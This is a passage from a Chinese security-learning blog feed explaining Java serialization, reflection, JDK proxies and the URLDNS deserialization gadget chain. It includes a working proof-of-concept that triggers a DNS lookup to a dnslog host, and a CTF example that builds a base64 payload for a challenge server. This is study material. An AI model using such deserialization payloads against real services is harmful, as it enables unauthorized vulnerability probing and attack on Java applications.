class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Unserialize.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span>  IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span>(Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过序列化和反序列化实现弹窗</p>
<p><a href="https://github.com/frohoff/ysoserial/">frohoff&#x2F;ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. (github.com)</a></p>
<h2 id="java-反射"><a href="#java-反射" class="headerlink" title="java 反射"></a>java 反射</h2><p>正射</p>
<p>我们在编写代码时，当需要到某一个类的时候，都会先了解这个类是做什么的，然后再实例化这个类，接着实例化好的对象进行操作，这就是正射，</p>
<p>反射</p>
<p>反射就是，一开始并不知道我们要初始化的类的对象是什么，自然也无法使用new 关键字来创建对象了。</p>
<p>反射的作用：让java具有动态性</p>
<p><strong>1.第一阶段：代码阶段&#x2F;编译阶段</strong></p>
<p>最开始学习java时，我们都会创建一个.java后缀的文件，然后在里面写上我们的代码。运行前通过javac对其进行编译，得到一个.class后缀的字节码文件</p>
<p><strong>2.第二阶段：类加载阶段（Class类阶段）</strong></p>
<p>当执行new一个对象时，会先通过类加载器ClassLoader将我们所需要的类进行加载（此处就体现了反射），这里的类加载是以.class后缀文件为基础的。加载完后，在堆中会产生一个Class类型的对象（一个类只有一个Class对象），这个对象包含了类的完整结构信息（成员变量、构造器、成员方法等），通过这个对象得到类的结构。（Class对象就像是一面镜子，透过这个镜子看到类的结构，故形象的称之为反射）</p>
<p><strong>3.第三阶段：Runtime运行阶段</strong></p>
<p>在运行阶段，我们通过new的方式创建的对象是在堆中，该对象知道它是属于哪个Class对象。若我们得到Class对象，也同样可以通过它来创建对象，调用对象方法，操作属性等。</p>
<p>java中与反射相关的类主要有四个：</p>
<ol>
<li><p><strong>java.lang.Class</strong></p>
<p>代表一个类，Class对象表示某个类加载后在堆中的对象</p>
</li>
<li><p><strong>java.lang.reflect.Method</strong></p>
<p>代表类的方法，Method对象表示某个类的方法</p>
</li>
<li><p><strong>java.lang.reflect.Field</strong></p>
<p>代表类的成员变量，Field对象表示某个类的成员变量</p>
</li>
<li><p><strong>java.lang.reflect.Constructor</strong></p>
<p>代表类的构造方法，Constructor对象表示构造器</p>
</li>
</ol>
<p><strong>修改已有对象的属性， 动态生成对象，动态调用方法，操作内部类和私有方法。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line">        Field[] personfields= c.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f:personfields)</span><br><span class="line">        &#123;</span><br><span class="line">         System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>1.Class类对象不是new出来的，而是系统创建的</strong></p>
<p>在类加载时，通过类加载器ClassLoader的loadClass方法得到该类的Class对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line"><span class="comment">/*        Field[] personfields= c.getFields();</span></span><br><span class="line"><span class="comment">        for(Field f:personfields)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">         System.out.println(f);</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        Field namefield=c.getField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        namefield.set(p,<span class="number">25</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/10/05/80e1c006911a108c.png"></p>
<p>无法修改，由于age是私有属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line"><span class="comment">/*        Field[] personfields= c.getFields();</span></span><br><span class="line"><span class="comment">        for(Field f:personfields)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">         System.out.println(f);</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        Field namefield=c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefield.set(p,<span class="number">25</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功修改</p>
<p>为上面person 类添加方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String act)</span>&#123;</span><br><span class="line">    System.out.println(act);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method actionmethod=c.getMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">      actionmethod.invoke(p,<span class="string">&quot;asdasjkjbmnmbmndf&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>修改为私有后，然后调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>   <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String act)</span>&#123;</span><br><span class="line">    System.out.println(act);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method actionmethod=c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">      actionmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      actionmethod.invoke(p,<span class="string">&quot;asdasjkjbmnmbmndf&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="jdk静态代理"><a href="#jdk静态代理" class="headerlink" title="jdk静态代理"></a>jdk静态代理</h2><p>代理模式（Proxy）：为其他对象提供一个代理以控制对这个对象的访问。<br>主要解决：在直接访问对象时带来的问题，比如说：要访问的对象在远程的机器上。在面向对象系统中，有些对象由于某些原因（比如对象创建开销很大，或者某些操作需要安全控制，或者需要进程外的访问），直接访问会给使用者或者系统结构带来很多麻烦，我们可以在访问此对象时加上一个对此对象的访问层。</p>
<p>代理模式的元素是：共同接口、代理对象、目标对象。</p>
<p>代理模式的行为：由代理对象执行目标对象的方法、由代理对象扩展目标对象的方法。</p>
<p>代理模式的宏观特性：对客户端只暴露出接口，不暴露它以下的架构。</p>
<p>好处多多：中间隔离了一层，更加符合开闭原则</p>
<p>在类的声明中，通过关键字extends来创建一个类的子类。一个类通过关键字implements声明自己使用一个或者多个接口。<br>extends 是继承某个类, 继承之后可以使用父类的方法, 也可以重写父类的方法; implements 是实现多个接口, 接口的方法一般为空的, 必须重写才能使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口 IUser.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//原来功能 Userlmp.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;展示&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//UserProxy.java  与Userlmp 共同使用IUser 接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProxy</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//进行代理</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">(IUser user)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.user=user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">    user.show();</span><br><span class="line">    <span class="comment">//实现对目标功能的扩展</span></span><br><span class="line">    System.out.println(<span class="string">&quot;调用了show&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ProxyTest.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        IUser user= <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">   <span class="comment">//    实现静态代理访问</span></span><br><span class="line">        IUser userProxy=<span class="keyword">new</span> <span class="title class_">UserProxy</span>(user);</span><br><span class="line">        userProxy.show();</span><br><span class="line">        &#125;&#125;      </span><br></pre></td></tr></table></figure>

<p>有时必须从几个类中派生出一个子类，继承它们所有的属性和方法。但是，Java不支持多重继承。有了接口，就可以得到多重继承的效果。</p>
<p>接口(interface)是抽象方法和常量值的定义的集合。</p>
<p>从本质上讲，接口是一种特殊的抽象类，这种抽象类中只包含常量和方法的定义，而没有变量和方法的实现。</p>
<p><strong>静态代理模式在不改变目标对象的前提下，实现了对目标对象的功能扩展。</strong><br><strong>不足：静态代理实现了目标对象的所有方法，一旦目标接口增加方法，代理对象和目标对象都要进行相应的修改，增加维护成本。</strong></p>
<h2 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h2><p>如果接口方法多，那代理必须跟着重写很多重复的代码，通过动态代理可以解决<strong>不用写代理类，直接创建代理实例，调用代理方法</strong></p>
<p>主要涉及两个类：<code>java.lang.reflect.Proxy</code> 和 <code>java.lang.reflect.InvocationHandler</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口 IUser.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">create</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//原来功能 Userlmp.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;展示&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">create</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//UserInvocationHandler.java  动态代理</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.user=user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//invoke 回调函数，确定调用那个方法</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy,Method method,Object[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了&quot;</span>+method.getName());</span><br><span class="line">        method.invoke(user,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ProxyTest.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        IUser user= <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">        <span class="comment">//动态代理</span></span><br><span class="line">        <span class="comment">//要代理的接口,要做的事情</span></span><br><span class="line">        InvocationHandler userinvocationhandler=<span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line">        IUser userProxy=(IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),</span><br><span class="line">        userinvocationhandler);</span><br><span class="line">        userProxy.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>动态代理一种设计模式，不修改原有类，增加功能，</p>
<p>动态代理的意义，少修改代码，适配强，在反序列化漏洞中的作用</p>
<p>readObject&gt;反序列化自动执行，invoke&gt;有函数调用，</p>
<p>拼接两条链，任意变固定</p>
<p><a href="https://www.jianshu.com/p/8ccdbe00ff06">Java代理（Proxy）模式 - 简书 (jianshu.com)</a></p>
<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p> URLDNS是JAVA复杂的反序列化链中最简单的一条，它不是一条真正意义上的“利⽤链”。因为它所能产生的结果不是命令执⾏，⽽是⼀次DNS请求。它使⽤Java内置的类构造，对第三⽅库没有依赖，对JDK版本没有要求，且其结果是发起一次DNS请求，不管目标有无回显，都⾮常适合用来检测是否存在反序列化漏洞</p>
<p>对链子进行分析</p>
<p>代码中最重要的三个类是HashMap,URL,URLStreamHandler。其中HashMap重写了readObject方法，URL类是里面有个hashCode()方法被HashMap的readObject()调用了，URLStreamHandler类是里面的getHostAddress被URL类里面的hashCode()方法调用</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/a1fc5b9d2a31b541.png"></p>
<p>在HashMap 中存在反序列化接口在该类的readObject方法的最后一行</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/64590666b0bd646a.png"></p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/61f192fe68fcb22f.png"></p>
<p>发现传入了一个Object类型的key，如果key为空，返回0，</p>
<p>返回 调用传入类key的hashCode 方法，而且URL类中也有URL类中含有hashCode()方法，所以是可以控制的</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/e8d2f8603bd54694.png"></p>
<p>这里说hashCode !&#x3D; -1，则直接返回hashCode，而该URL类的hashCode值被默认定义成了-1。如果等于-1，则继续往下走，我们继续跟进hashCode(this)方法</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/a7497b49e97087f1.png"></p>
<p>再跟进getHostAddress方法</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/3694b1100a74f071.png">接着跟进</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/3d267520d169e20b.png"></p>
<p>判断是否为空，最后执行InetAddress.getByName(host)获取目标ip地址，其实在网络中就是一次DNS请求</p>
<p>最后理一遍思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.java</span><br><span class="line">hashMap-&gt;readObject(),最后一行中调用hash(key)</span><br><span class="line">hashMap-&gt;hash(),key不为空，调用key.hashCode(),</span><br><span class="line">URL.java</span><br><span class="line">URL-&gt;hashCode(),hashCode的初始值为-1，若不为-1，返回 handler.hashCode(this);</span><br><span class="line">==&gt;URLStreamHandler.hashCode,进入getHostAddress(u),</span><br><span class="line">进入URLStreamHandler.getHostAddress，返还u.getHostAddress();即URL-&gt;getHostAddress()</span><br><span class="line">hostAddress = InetAddress.getByName(host);</span><br><span class="line">发起dns 请求</span><br></pre></td></tr></table></figure>

<p>构链思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashmap=new Hashmap</span><br><span class="line">url=new URL</span><br><span class="line">反射修改url1的URL的hashCode的为1</span><br><span class="line">hashMap.put(url,&quot;test&quot;)</span><br><span class="line">修改URL的hashCode为回-1</span><br></pre></td></tr></table></figure>

<p>poc 链如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> getObject(<span class="string">&quot;http://md8zyk.dnslog.cn&quot;</span>);</span><br><span class="line">        runReadobject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//这里不能发起请求，通过反射将url对象的hashcode改成不是一</span></span><br><span class="line">        filed.set(url1, <span class="number">123</span>);</span><br><span class="line">        <span class="comment">//同样这里需要通过反射改成一才能继续执行</span></span><br><span class="line">        hashMap.put(url1, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        filed.set(url1, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">runReadobject</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(outputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(outputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;  </span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">data</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line"><span class="type">ObjectOutput</span> <span class="variable">oos</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(data);  </span><br><span class="line">oos.writeObject(obj);  </span><br><span class="line">oos.flush();  </span><br><span class="line">oos.close();  </span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://28bc736c-f956-4721-8651-efc6e2beb94a.challenge.ctf.show/&quot;</span>);  </span><br><span class="line">Class&lt;?&gt; c=url.getClass();  </span><br><span class="line">Field hashcode=c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  </span><br><span class="line">hashcode.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">hashcode.set(url,<span class="number">1</span>);  </span><br><span class="line">HashMap&lt;URL,Integer&gt; h = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();  </span><br><span class="line">h.put(url,<span class="number">1</span>);  </span><br><span class="line">hashcode.set(url,-<span class="number">1</span>);  </span><br><span class="line">serialize(h);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>ATT&amp;CK红队评估实战靶场（二）</title>
    <url>/2023/07/28/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f8f493fc2fc01a930f12b25bf291488d9da942d856c5da74514c059ecdc24930"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
